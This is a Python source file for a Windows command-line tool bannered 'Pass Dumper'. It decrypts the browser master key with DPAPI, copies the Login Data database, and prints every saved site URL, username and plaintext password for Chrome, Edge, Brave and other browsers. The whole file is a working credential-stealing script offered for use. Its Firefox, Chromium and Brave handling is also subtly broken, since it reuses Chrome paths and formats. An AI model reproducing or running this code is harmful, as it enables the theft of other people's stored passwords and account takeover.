import os
import base64
import json
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import getpass

def get_master_key(browser):
    try:
        if browser == 'chrome' or browser == 'chromium' or browser == 'brave':
            local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\\Local\\Google\\Chrome\\User Data\\Local State')
        elif browser == 'edge':
            local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\\Local\\Microsoft\\Edge\\User Data\\Local State')
        elif browser == 'firefox':
            local_state_path = os.path.join(os.environ['USERPROFILE'], r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        encrypted_key = encrypted_key[5:]
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        return None

def decrypt_password(password, master_key):
    try:
        if password[:3] == b'v10':
            iv = password[3:15]
            encrypted_password = password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_password = cipher.decrypt(encrypted_password)[:-16]
            return decrypted_password.decode('utf-8')
        else:
            decrypted_password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
            return decrypted_password.decode('utf-8')
    except Exception as e:
        return ""

def retrieve_passwords(browser, master_key):
    original_db_path = ''
    
    if browser == 'chrome' or browser == 'chromium' or browser == 'brave':
        original_db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data')
    elif browser == 'edge':
        original_db_path = os.path.join(os.environ['USERPROFILE'], r'AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data')
    elif browser == 'firefox':
        profile_path = os.path.join(os.environ['USERPROFILE'], r'AppData\\Roaming\\Mozilla\\Firefox\\Profiles')
        for profile in os.listdir(profile_path):
            if profile.endswith('.default-release'):
                original_db_path = os.path.join(profile_path, profile, 'logins.json')
                break

    temp_db_path = os.path.join(os.environ['TEMP'], 'LoginDataCopy.db')

    try:
        shutil.copy2(original_db_path, temp_db_path)
    except Exception as e:
        return "Error copying database file."

    try:
        conn = sqlite3.connect(temp_db_path)
        conn.execute('PRAGMA journal_mode=WAL;')
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        output = ''
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username or decrypted_password:
                output += f"Origin URL: {url}\n"
                output += f"Username: {username}\n"
                output += f"Password: {decrypted_password}\n"
                output += "=" * 50 + "\n"
        
        cursor.close()
        conn.close()
        return output
    except Exception as e:
        return f"Error reading database: {e}"
    finally:
        if os.path.exists(temp_db_path):
            os.remove(temp_db_path)

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    ascii_art = """
  _____                _____                  _               
 |  __ \              |  __ \                | |              
 | |__) |_ _ ___ ___  | |  | |_   _ _ __ ___ | |__   ___ _ __ 
 |  ___/ _` / __/ __| | |  | | | | | '_ ` _ \| '_ \ / _ \ '__|
 | |  | (_| \__ \__ \ | |__| | |_| | | | | | | |_) |  __/ |   
 |_|   \__,_|___/___/ |_____/ \__,_|_| |_| |_|_.__/ \___|_|                  
                                    github.com/                                              
    """
    print(ascii_art)
    print("Select the platform to retrieve passwords from:")
    print("1. Chrome")
    print("2. Chromium")
    print("3. Edge")
    print("4. Firefox")
    print("5. Brave")
    print("6. Everywhere (all browsers)")

    choice = input("Enter your choice (1-6): ").strip()

    if choice == '1':
        browser = 'chrome'
    elif choice == '2':
        browser = 'chromium'
    elif choice == '3':
        browser = 'edge'
    elif choice == '4':
        browser = 'firefox'
    elif choice == '5':
        browser = 'brave'
    elif choice == '6':
        browser = 'everywhere'
    else:
        print("Invalid choice.")
        return

    if browser != 'everywhere':
        master_key = get_master_key(browser)
        if not master_key:
            print("Failed to retrieve master key.")
            return
        
        passwords = retrieve_passwords(browser, master_key)
        print(passwords)
    else:
        master_key_chrome = get_master_key('chrome')
        master_key_edge = get_master_key('edge')
        master_key_firefox = get_master_key('firefox')
        master_key_brave = get_master_key('brave')
        
        if master_key_chrome:
            passwords_chrome = retrieve_passwords('chrome', master_key_chrome)
            print(passwords_chrome)
        if master_key_edge:
            passwords_edge = retrieve_passwords('edge', master_key_edge)
            print(passwords_edge)
        if master_key_firefox:
            passwords_firefox = retrieve_passwords('firefox', master_key_firefox)
            print(passwords_firefox)
        if master_key_brave:
            passwords_brave = retrieve_passwords('brave', master_key_brave)
            print(passwords_brave)

if __name__ == '__main__':
    main()
